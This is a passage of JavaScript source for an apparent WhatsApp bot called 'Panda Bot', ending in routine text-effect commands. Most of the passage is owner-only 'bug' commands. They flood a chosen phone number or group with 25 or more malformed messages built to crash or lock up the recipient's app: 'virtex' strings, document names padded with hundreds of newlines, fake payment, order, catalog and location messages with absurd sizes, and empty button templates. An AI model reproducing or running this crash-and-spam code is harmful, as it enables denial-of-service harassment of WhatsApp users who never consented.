text: `Panda Bot ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
background: ppnyauser }}}}, {quoted:lep})
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'vngas':{
if (!itsMePanda) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
Panda.sendMessage(num, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'kongas':{
if (!itsMePanda) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
Panda.sendContact(num, owner, lep)
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'docgas':{
if (!itsMePanda) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
Panda.sendMessage(num, { 
document: ppnyauser, 
fileName: `🔥 Panda BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
mimetype: `application/txt`, 
jpegThumbnail: ppnyauser, 
fileLength: "999999999", 
mentions:[sender] }, {quoted:lep})
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'stickgas':{
if (!itsMePanda) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
Panda.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'itemgas': {
if (!itsMePanda) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(num, `Panda Bot ${virus}${virtex(prefix)}`, `Panda Bot ${virus}${virtex(prefix)}`, `Panda Bot ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'cataloggas': {
if (!itsMePanda) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: Panda.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `Panda Bot WhatsApp ${virus} ${virtex(prefix)}`,
"description": `${virus}${virtex(prefix)}`,
"currencyCode": "IDR",
"priceAmount1000": "100000000000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `Nomor Owner Di Atas`,
"url": `https://wa.me/6287705048235`
},
"businessOwnerJid": "6287705048235@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: lep  })
Panda.relayMessage(num, catalog.message, { messageId: catalog.key.id })
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'kaylog':{
if (!itsMePanda) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: Panda.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `Panda Bot WhatsApp ${virus} ${virtex(prefix)}`,
"description": `${virus}${virtex(prefix)}`,
"currencyCode": "IDR",
"priceAmount1000": "100000000000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `Nomor Owner Di Atas`,
"url": `https://wa.me/6287705048235`
},
"businessOwnerJid": "6287705048235@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: lep  })
Panda.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'kayloc':{
if (!itsMePanda) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: Panda.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"name": `Panda Bot ${virus}${virtex(prefix)}`,
"url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
"caption": `Panda Bot ${virus}${virtex(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
"mtype": "locationMessage"
}
}), { userJid: m.chat, quoted: lep })
Panda.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'kaykontak':{
if (!itsMePanda) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
Panda.sendContact(m.chat, owner, lep)
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'kayitem':{
if (!itsMePanda) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(m.chat, `Panda Bot ${virus}${virtex(prefix)}`, `Panda Bot ${virus}${virtex(prefix)}`, `Panda Bot ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'kaystick':{
if (!itsMePanda) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
Panda.sendMessage(m.chat, {sticker: ppnyauser},{ quoted: lep })
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'kaydoc':{
if (!itsMePanda) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
Panda.sendMessage(m.chat, { 
document: ppnyauser, 
fileName: `🔥 Panda BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
mimetype: `application/txt`, 
jpegThumbnail: ppnyauser, 
fileLength: "999999999", 
mentions:[sender] }, {quoted:gifes})
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'kayvn':{
if (!itsMePanda) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
Panda.sendMessage(m.chat, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'kayteks':{
if (!itsMePanda) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
Panda.relayMessage(m.chat, {
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
text: `Panda Bot ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
background: ppnyauser }}}}, {quoted:lep})
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'santedpcparah': 
if (!itsMePanda) return reply(mess.owner)
if (!q) return reply(`Contoh ${command} 6281297970769`)
nmn = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
if (Input == creator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
let hdhe = await Panda.onWhatsApp(nmn)
if (hdhe.length == 0) return reply(`Ingresa un número válido y registrado en WhatsApp!`)
santedpc(bygbt, nmn, sleep)
break
case 'santedgcparah': 
if (!itsMePanda) return reply(mess.owner)
if (!q) return reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let fhehfhe = args[0].split('https://chat.whatsapp.com/')[1]
let mnm = await Panda.groupAcceptInvite(fhehfhe)
santedgc(bygbt, mnm, sleep)
break
case 'santetpc':
if (!itsMePanda) return reply(mess.owner)
if (!q) return reply(`Contoh ${command} 6281297970769`)
tosend = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
if (Input == creator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
let kgdhwus = await Panda.onWhatsApp(tosend)
if (kgdhwus.length == 0) return reply(`Ingresa un número válido y registrado en WhatsApp!`)
jumlah = '30'
for (let i = 0; i < jumlah; i++) {
Panda.sendMessage(tosend, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
await sleep(1000)
}
reply(`Realizado`)
break
case 'santetgc':
if (!itsMePanda) return reply(mess.owner)
if (!q) return reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let resultny = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '30'
for (let i = 0; i < jumlah; i++) {
let tosendgc = await Panda.groupAcceptInvite(resultny)
Panda.sendMessage(tosendgc, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
await sleep(1000)
}
reply(`Realizado`)
break
case 'spambugvip':{
if (!itsMePanda) return reply(mess.owner)
if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor|jumlah\nContoh ${prefix+command} 56921700706|5`)
numt = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = q.split('|')[1]
let cekno = await Panda.onWhatsApp(numt)
if (cekno.length == 0) return reply(`Ingresa un número válido y registrado en WhatsApp!`)
if (isNaN(jumlah)) return reply(`Harus berupa angka`)
var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '56921700706@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-Panda ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyauser, caption: `ৡৢ͜͡𝟒𝟎𝟒-Panda ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
var pollCreation = generateWAMessageFromContent(from,proto.Message.fromObject({pollCreationMessage: {name: 'HALO DEKK 🥶',options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'Creador del bot' }],selectableOptionsCount: 5,},}),{ userJid: from, quoted: lep })
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: Panda.waUploadToServer })
var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-Panda ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,jpegThumbnail: ppnyauser,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-Panda ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: lep })
var audio = generateWAMessageFromContent(from,proto.Message.fromObject({audioMessage: {url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',mimetype: 'audio/mpeg',fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',fileLength: '258330',seconds: 16,ptt: false,mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',mediaKeyTimestamp: '1657190832',},}),{ userJid: from, quoted: lep })
var image = generateWAMessageFromContent(from,proto.Message.fromObject({imageMessage: {url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',mimetype: 'image/jpeg',caption: `ৡৢ͜͡𝟒𝟎𝟒-Panda ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',fileLength: '42521',height: 426,width: 640,mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',mediaKeyTimestamp: '1657286523',jpegThumbnail: messa.imageMessage,},}),{ userJid: from, quoted: lep })
var document = generateWAMessageFromContent(from,proto.Message.fromObject({documentMessage: {url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',mimetype: 'application/octet-stream',title: '.dev',fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',pageCount: 0,mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',fileName: `ৡৢ͜͡𝟒𝟎𝟒-Panda ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',mediaKeyTimestamp: '1657288637',},}),{ userJid: from, quoted: lep })
var sticker = generateWAMessageFromContent(from,proto.Message.fromObject({stickerMessage: {url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',mimetype: 'image/webp',height: 64,width: 64,directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',fileLength: '7774',mediaKeyTimestamp: '1657290167',isAnimated: false,},}),{ userJid: from, quoted: lep })
var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-Panda ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: lep })
for (let i = 0; i < jumlah; i++) {
Panda.relayMessage(numt, buginvite.message, { messageId: buginvite.key.id })
Panda.relayMessage(numt, { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
Panda.relayMessage(numt, pollCreation.message, { messageId: pollCreation.key.id })
Panda.relayMessage(numt, order.message, { messageId: order.key.id })
Panda.relayMessage(numt, audio.message, { messageId: audio.key.id })
Panda.relayMessage(numt, image.message, { messageId: image.key.id })
Panda.relayMessage(numt, document.message, { messageId: document.key.id })
Panda.relayMessage(numt, liveLocation.message, { messageId: liveLocation.key.id })
Panda.relayMessage(numt, sticker.message, { messageId: sticker.key.id })
Panda.sendKatalog(numt, `ৡৢ͜͡𝟒𝟎𝟒-Panda ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-Panda ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ppnyauser, { quoted: lep })
Panda.sendMessage(numt, { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
}
}
break
case 'sendbug':{
if (!itsMePanda) return reply(mess.owner)
if (!q) return reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
let kir = await Panda.groupAcceptInvite(result)
Panda.relayMessage(kir, {
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
text: `Panda Bot ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
background: ppnyauser }}}}, {quoted:lep})
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'senddoc':{
if (!itsMePanda) return reply(mess.owner)
if (!q) return reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
let kir = await Panda.groupAcceptInvite(result)
Panda.sendMessage(kir, { 
document: ppnyauser, 
fileName: `🔥 Panda BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
mimetype: `application/txt`, 
jpegThumbnail: ppnyauser, 
mentions:[sender] }, {quoted:lep})
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'sendloc':{
if (!itsMePanda) return reply(mess.owner)
if (!q) return reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
let kir = await Panda.groupAcceptInvite(result)
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: Panda.waUploadToServer })
var location = generateWAMessageFromContent(kir, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"name": `Panda Bot WhatsApp ${virus}`,
"address": `Created By Panda ${virtex(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted: lep })
Panda.relayMessage(kir, location.message, { messageId: location.key.id })
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass': 
case 'papercut': 
case 'watercolor': 
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
case 'snow': 
case 'cloud': 
case 'honey': 
case 'ice': 
case 'fruitjuice': 
case 'biscuit': 
case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
case 'firework': 
case 'skeleton': 
case 'blackpink': 
case 'sand': 
case 'glue': 
case '1917': 
case 'leaves': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Ejemplo : ${prefix+command} Panda`) 
reply(mess.wait)
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
